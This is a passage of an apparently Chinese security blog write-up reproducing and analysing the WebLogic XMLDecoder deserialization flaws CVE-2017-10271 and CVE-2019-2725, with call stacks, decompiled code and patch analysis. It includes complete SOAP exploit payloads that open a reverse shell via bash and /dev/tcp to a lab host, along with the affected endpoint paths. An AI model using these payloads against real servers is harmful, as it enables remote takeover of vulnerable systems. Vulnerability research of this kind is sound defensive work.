class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/172.22.0.1/7777 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bp抓包<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230822144140.png"><br>反弹shell成功<br><strong>远程调试</strong>：<br>进入容器，配置weblogic开启远程调试<br>改<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code>文件，加入以下内容</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">debugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230822162900.png"><br>重启容器即可调试<br>将需要调试目录导出，放入IDEA，即可启动调试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="built_in">cp</span> 9e239f7fb3ff:/root ./cve201710271Env</span><br><span class="line"><span class="built_in">cd</span> cve201710271Env/Oracle/Middleware</span><br><span class="line"><span class="built_in">mkdir</span> lib</span><br><span class="line">find ./ -name <span class="string">&quot;*.jar&quot;</span> -<span class="built_in">exec</span> <span class="built_in">cp</span> &#123;&#125; ./lib/ \;</span><br><span class="line">find ./ -name <span class="string">&quot;*.war&quot;</span> -<span class="built_in">exec</span> <span class="built_in">cp</span> &#123;&#125; ./lib/ \;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong>：<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">readUTF:<span class="number">111</span>, WorkContextXmlInputAdapter (weblogic.wsee.workarea)</span><br><span class="line">readEntry:<span class="number">92</span>, WorkContextEntryImpl (weblogic.workarea.spi)</span><br><span class="line">receiveRequest:<span class="number">179</span>, WorkContextLocalMap (weblogic.workarea)</span><br><span class="line">receiveRequest:<span class="number">163</span>, WorkContextMapImpl (weblogic.workarea)</span><br><span class="line">receive:<span class="number">71</span>, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)</span><br><span class="line">readHeaderOld:<span class="number">107</span>, WorkContextTube (weblogic.wsee.jaxws.workcontext)</span><br><span class="line">processRequest:<span class="number">43</span>, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)</span><br><span class="line">__doRun:<span class="number">866</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">_doRun:<span class="number">815</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">doRun:<span class="number">778</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">runSync:<span class="number">680</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">process:<span class="number">403</span>, WSEndpointImpl$<span class="number">2</span> (com.sun.xml.ws.server)</span><br><span class="line">handle:<span class="number">539</span>, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)</span><br><span class="line">handle:<span class="number">253</span>, HttpAdapter (com.sun.xml.ws.transport.http)</span><br><span class="line">handle:<span class="number">140</span>, ServletAdapter (com.sun.xml.ws.transport.http.servlet)</span><br><span class="line">handle:<span class="number">171</span>, WLSServletAdapter (weblogic.wsee.jaxws)</span><br><span class="line">run:<span class="number">708</span>, HttpServletAdapter$AuthorizedInvoke (weblogic.wsee.jaxws)</span><br><span class="line">doAs:<span class="number">363</span>, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:<span class="number">146</span>, SecurityManager (weblogic.security.service)</span><br><span class="line">authenticatedInvoke:<span class="number">103</span>, ServerSecurityHelper (weblogic.wsee.util)</span><br><span class="line">run:<span class="number">311</span>, HttpServletAdapter$<span class="number">3</span> (weblogic.wsee.jaxws)</span><br><span class="line">post:<span class="number">336</span>, HttpServletAdapter (weblogic.wsee.jaxws)</span><br><span class="line">doRequest:<span class="number">99</span>, JAXWSServlet (weblogic.wsee.jaxws)</span><br><span class="line">service:<span class="number">99</span>, AbstractAsyncServlet (weblogic.servlet.http)</span><br><span class="line">service:<span class="number">820</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">run:<span class="number">227</span>, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)</span><br><span class="line">invokeServlet:<span class="number">125</span>, StubSecurityHelper (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">301</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">184</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">wrapRun:<span class="number">3732</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">3696</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">doAs:<span class="number">321</span>, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:<span class="number">120</span>, SecurityManager (weblogic.security.service)</span><br><span class="line">securedExecute:<span class="number">2273</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">2179</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">1490</span>, ServletRequestImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">256</span>, ExecuteThread (weblogic.work)</span><br><span class="line">run:<span class="number">221</span>, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>

<p>查看weblogic&#x2F;wsee&#x2F;jaxws&#x2F;workcontext&#x2F;WorkContextServerTube的processRequest方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> NextAction <span class="title function_">processRequest</span><span class="params">(Packet var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isUseOldFormat = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (var1.getMessage() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取头部信息</span></span><br><span class="line">        <span class="type">HeaderList</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getMessage().getHeaders();</span><br><span class="line">        <span class="comment">// 从消息的头部列表中获取指定的头部信息</span></span><br><span class="line">        <span class="type">Header</span> <span class="variable">var3</span> <span class="operator">=</span> var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在指定的头部信息，则使用旧的格式进行读取处理，并将isUseOldFormat标记为true</span></span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            <span class="built_in">this</span>.readHeaderOld(var3);</span><br><span class="line">            <span class="built_in">this</span>.isUseOldFormat = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 从消息的头部列表中获取JAX-WS工作区的头部信息</span></span><br><span class="line">        <span class="type">Header</span> <span class="variable">var4</span> <span class="operator">=</span> var2.get(<span class="built_in">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="comment">// 如果存在JAX-WS工作区的头部信息，则进行读取处理</span></span><br><span class="line">            <span class="built_in">this</span>.readHeader(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用父类的processRequest方法进行进一步处理，并返回NextAction对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.processRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230822211637.png"><br>进入weblogic&#x2F;wsee&#x2F;jaxws&#x2F;workcontext&#x2F;WorkContextTube的readHeaderOld方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readHeaderOld</span><span class="params">(Header var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取Header中的XML数据流</span></span><br><span class="line">        <span class="type">XMLStreamReader</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readHeader();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        <span class="comment">// 创建XMLStreamReaderToXMLStreamWriter实例，用于将XMLStreamReader的数据桥接到XMLStreamWriter</span></span><br><span class="line">        <span class="type">XMLStreamReaderToXMLStreamWriter</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLStreamReaderToXMLStreamWriter</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">XMLStreamWriter</span> <span class="variable">var5</span> <span class="operator">=</span> XMLStreamWriterFactory.create(var4);</span><br><span class="line">        var3.bridge(var2, var5);</span><br><span class="line">        var5.close();</span><br><span class="line">        <span class="comment">// 创建WorkContextXmlInputAdapter实例，并将XML数据流转换为适配器可接受的输入流</span></span><br><span class="line">        <span class="type">WorkContextXmlInputAdapter</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var4.toByteArray()));</span><br><span class="line">        <span class="comment">// 调用receive方法处理适配器中的输入流</span></span><br><span class="line">        <span class="built_in">this</span>.receive(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">        <span class="comment">// 抛出WebServiceException异常，表示在处理XML数据流时出现错误</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">        <span class="comment">// 抛出WebServiceException异常，表示在读取或处理输入流时出现错误</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var8);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法将XML数据流转换为字节数组，并通过适配器将其转换为可处理的输入流。然后，调用receive方法处理适配器中的输入流<br>其中进入WorkContextXmlInputAdapter的构造函数，它实例化了一个XMLDecoder对象，并将输入的xml输入流作为参数，这与前面的测试例子一样，现在目标是需要调用readObject进行反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.xmlDecoder = <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230822213156.png"><br>进入weblogic&#x2F;wsee&#x2F;jaxws&#x2F;workcontext&#x2F;WorkContextServerTube的receive方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">receive</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取WorkContextMapInterceptor实例</span></span><br><span class="line">    <span class="type">WorkContextMapInterceptor</span> <span class="variable">var2</span> <span class="operator">=</span> WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">    <span class="comment">// 调用WorkContextMapInterceptor的receiveRequest方法，将WorkContextInput对象传递给拦截器进行处理</span></span><br><span class="line">    var2.receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的var1是前面创建的WorkContextXmlInputAdapter对象，后面的receiveRequest、receiveRequest、readEntry等方法中都是WorkContextXmlInputAdapter对象，直到进入weblogic&#x2F;wsee&#x2F;workarea&#x2F;WorkContextXmlInputAdapter的readUTF方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">readUTF</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> (String)<span class="built_in">this</span>.xmlDecoder.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它调用了readObject方法对目标xml进行反序列化，从而触发命令执行。后面XMLDecoder的调用链和3.2.2中的测试是一致的<br><strong>补丁分析</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">   <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="type">int</span> <span class="variable">overallarraylength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:object&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;new&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:new&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:method&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;void&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">&quot;index&quot;</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid attribute for element void:&quot;</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;array&quot;</span>)) &#123;</span><br><span class="line">                  <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="literal">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">&quot;byte&quot;</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The value of class attribute is not valid for array element.&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用黑名单对上述标签进行了过滤</p>
<h3 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h3><p><strong>影响范围</strong>：<br>WebLogic 10.X<br>WebLogic 12.1.3<br><strong>影响uri</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/_async/AsyncResponseService</span><br><span class="line">/_async/AsyncResponseServiceJms</span><br><span class="line">/_async/AsyncResponseServiceHttps</span><br><span class="line">/_async/AsyncResponseServiceSoap12</span><br><span class="line">/_async/AsyncResponseServiceSoap12Jms</span><br><span class="line">/_async/AsyncResponseServiceSoap12Https</span><br></pre></td></tr></table></figure>

<p><strong>复现</strong>：<br>exp：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/172.22.0.1/7777 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230823131024.png"><br><strong>漏洞分析</strong>：<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">readUTF:<span class="number">111</span>, WorkContextXmlInputAdapter (weblogic.wsee.workarea)</span><br><span class="line">readEntry:<span class="number">92</span>, WorkContextEntryImpl (weblogic.workarea.spi)</span><br><span class="line">receiveRequest:<span class="number">179</span>, WorkContextLocalMap (weblogic.workarea)</span><br><span class="line">receiveRequest:<span class="number">163</span>, WorkContextMapImpl (weblogic.workarea)</span><br><span class="line">handleRequest:<span class="number">27</span>, WorkAreaServerHandler (weblogic.wsee.workarea)</span><br><span class="line">handleRequest:<span class="number">141</span>, HandlerIterator (weblogic.wsee.handler)</span><br><span class="line">dispatch:<span class="number">114</span>, ServerDispatcher (weblogic.wsee.ws.dispatch.server)</span><br><span class="line">invoke:<span class="number">80</span>, WsSkel (weblogic.wsee.ws)</span><br><span class="line">handlePost:<span class="number">66</span>, SoapProcessor (weblogic.wsee.server.servlet)</span><br><span class="line">process:<span class="number">44</span>, SoapProcessor (weblogic.wsee.server.servlet)</span><br><span class="line">run:<span class="number">285</span>, BaseWSServlet$AuthorizedInvoke (weblogic.wsee.server.servlet)</span><br><span class="line">service:<span class="number">169</span>, BaseWSServlet (weblogic.wsee.server.servlet)</span><br><span class="line">service:<span class="number">820</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">run:<span class="number">227</span>, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)</span><br><span class="line">invokeServlet:<span class="number">125</span>, StubSecurityHelper (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">301</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">184</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">wrapRun:<span class="number">3732</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">3696</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">doAs:<span class="number">321</span>, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:<span class="number">120</span>, SecurityManager (weblogic.security.service)</span><br><span class="line">securedExecute:<span class="number">2273</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">2179</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">1490</span>, ServletRequestImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">256</span>, ExecuteThread (weblogic.work)</span><br><span class="line">run:<span class="number">221</span>, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>

<p>在weblogic&#x2F;wsee&#x2F;server&#x2F;servlet&#x2F;SoapProcessor中的process方法对soap消息进行了处理，post提交，调用其本类的handlePost方法进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handlePost</span><span class="params">(BaseWSServlet var1, HttpServletRequest var2, HttpServletResponse var3)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">assert</span> var1.getPort() != <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 获取WsPort对象</span></span><br><span class="line">    <span class="type">WsPort</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getPort();</span><br><span class="line">    <span class="comment">// 获取绑定类型</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">var5</span> <span class="operator">=</span> var4.getWsdlPort().getBinding().getBindingType();</span><br><span class="line">    <span class="comment">// 创建HttpServerTransport实例，用于处理HTTP请求和响应</span></span><br><span class="line">    <span class="type">HttpServerTransport</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServerTransport</span>(var2, var3);</span><br><span class="line">    <span class="comment">// 获取WsSkel对象</span></span><br><span class="line">    <span class="type">WsSkel</span> <span class="variable">var7</span> <span class="operator">=</span> (WsSkel)var4.getEndpoint();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用Connection工厂创建服务器连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">var8</span> <span class="operator">=</span> ConnectionFactory.instance().createServerConnection(var6, var5);</span><br><span class="line">        var7.invoke(var8, var4);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ConnectionException var9) &#123;</span><br><span class="line">        <span class="comment">// 调用WsSkel的invoke方法，处理连接和WsPort对象</span></span><br><span class="line">        <span class="built_in">this</span>.sendError(var3, var9, <span class="string">&quot;Failed to create connection&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var10) &#123;</span><br><span class="line">        <span class="built_in">this</span>.sendError(var3, var10, <span class="string">&quot;Unknown error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>中间的其他过程不管，来到weblogic&#x2F;wsee&#x2F;workarea&#x2F;WorkAreaServerHandler中的handleRequest方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">handleRequest</span><span class="params">(MessageContext var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">WlMessageContext</span> <span class="variable">var2</span> <span class="operator">=</span> WlMessageContext.narrow(var1);</span><br><span class="line">        <span class="comment">// 获取消息头部</span></span><br><span class="line">        <span class="type">MsgHeaders</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getHeaders();</span><br><span class="line">        <span class="comment">// 从消息头部获取WorkAreaHeader</span></span><br><span class="line">        <span class="type">WorkAreaHeader</span> <span class="variable">var4</span> <span class="operator">=</span> (WorkAreaHeader)var3.getHeader(WorkAreaHeader.TYPE);</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取WorkContextMapInterceptor实例</span></span><br><span class="line">            <span class="type">WorkContextMapInterceptor</span> <span class="variable">var5</span> <span class="operator">=</span> WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">            <span class="comment">// 使用WorkContextXmlInputAdapter适配器接收请求</span></span><br><span class="line">            var5.receiveRequest(<span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(var4.getInputStream()));</span><br><span class="line">            <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                Verbose.log(<span class="string">&quot;Received WorkAreaHeader &quot;</span> + var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JAXRPCException</span>(<span class="string">&quot;Unable to procees WorkContext:&quot;</span> + var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面也提到，WorkContextXmlInputAdapter的构造函数中new了一个XMLDecoder对象，传入的是soap header的wordcontext元素<br>接下来的步骤和CVE-2017-10271一致，其实它们的漏洞原理都是一致的<br><strong>补丁分析</strong>：<br>使用网上一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20190501174422-b2e76a36-6bf5-1.png"><br>这里直接ban掉了class元素以及限制了array元素的长度</p>
